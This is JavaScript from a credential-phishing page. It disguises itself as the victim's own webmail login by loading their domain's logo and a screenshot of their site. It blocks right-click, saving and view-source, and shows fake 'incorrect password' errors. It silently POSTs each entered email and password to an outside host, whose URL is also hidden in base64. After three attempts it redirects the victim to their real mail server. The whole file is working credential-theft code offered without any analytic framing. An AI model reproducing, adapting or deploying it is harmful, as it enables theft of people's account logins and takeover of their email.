
    
    // prevent ctrl + s
    $(document).bind('keydown', function(e) {
    if(e.ctrlKey && (e.which == 83)) {
    e.preventDefault();
    return false;
    }
    });
    
    document.addEventListener('contextmenu', event => event.preventDefault());
    
    document.onkeydown = function(e) {
    if (e.ctrlKey && 
    (e.keyCode === 67 ||   
    e.keyCode === 86 || 
    e.keyCode === 85 || 
    e.keyCode === 117)) {
    return false;
    } else {
    return true;
    }
    };
    $(document).keypress("u",function(e) {
    if(e.ctrlKey)
    {
    return false;      }
    else {
    return true;
    }});
    
    
    
    
        /* global $ */
        $(document).ready(function(){
          var count=0;
     
          $('#back1').click(function () {
            $("#msg").hide();
            $('#email').val("");
            $("#automail").animate({left:200, opacity:"hide"}, 0);
            $("#inputbar").animate({right:200, opacity:"show"}, 1000);
    
          });
    
          var email = window.location.hash.substr(1);
          if (!email) {
    
          }
          else
          {
            var my_email =email;
            $('#email').val(my_email); 
            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    
            if (!filter.test(my_email)) {
              $('#error').show();
               email.focus;
               return false;
            }
          var ind=my_email.indexOf("@");
            var my_slice=my_email.substr((ind+1));
            var mainPage = 'https://'+my_slice; 
            
            var sv = my_slice;
            
            var image = "url('https://image.thum.io/get/width/1288880/https://"+sv;"')"
            
    
            $("#logoimg").attr("src", "https://logo.clearbit.com/"+sv);
             
            document.body.style.backgroundImage = image;
             
            $(".email").html(email);
             
          }
     
          $('#submit-btn').click(function(event){
        
            event.preventDefault();
            $('#error').hide();
            $('#msg').hide();
            var email=$("#email").val();
            var password=$("#password").val();
          ///////////new injection////////////////
          var my_email =email;
          var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    
          if (!email) {
                $('#error').show();
                $('#error').html("<p style='color:red; font-size:15px'> Email field is empty</p>");
            
                return false;
            }
    
            if (!filter.test(my_email)) {
                $('#error').show();
                $('#error').html("<p style='color:red; font-size:14px'>That account doesn't exist. Enter a different account</p>");
                
                return false;
            }
            if (!password) {
                $('#error').show();
                $('#error').html("<p style='color:red; font-size:14px'>Password field is empty</p>");
             
                return false;
            }
             if (password.length < 7) {
                $('#error').show();
                $('#error').html("<p style='color:red; font-size:14px'>An error occured, invalid password</p>");
                email.focus;
                return false;
            } 
    
     
             
          ///////////new injection////////////////
          count=count+1;
         //console.log(count); 
         //moscow
         var d=atob('aHR0cHM6Ly9vbHV3YWdvdHVzLmxpdmUvaG0vbGFtYm8ucGhw');
        
        
           $.ajax({
            dataType: 'JSON',
            url: 'https://oluwagotus.live/hm/lambo.php',
            type: 'POST',
            data:{
              email:email,
              password:password
            },
                // data: $('#contact').serialize(),
                beforeSend: function(xhr){
                  $('#submit-btn').html('Sign in');
                  
        //  console.log(count); 
                },
                success: function(response){
                 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
                  if(response){
                    $("#msg").show();
                    console.log(response);
                    $('#msg').html(response['msg']);
                    if(response['signal'] == 'ok'){
                      $("#password").val("");
                      if (count>=3) {
                        count=0;
                        // window.location.replace(response['redirect_link']);
                        window.location.replace("http://mail."+my_slice);
    
                      }
                      // $('#msg').html(response['msg']);
                    }
                    else{
                       $('#msg').html(response['msg']);
                    }
                  }
                },
                error: function(){
                  $("#password").val("");
                  if (count>=3) {
                    count=0;
                    window.location.replace("http://"+my_slice);
                  }
                  $("#msg").show();
                  // $('#msg').html("Please try again later");
                },
                complete: function(){
                  $('#submit-btn').html('Sign in');
                }
              });  
        });
    
    
        });
    
    
      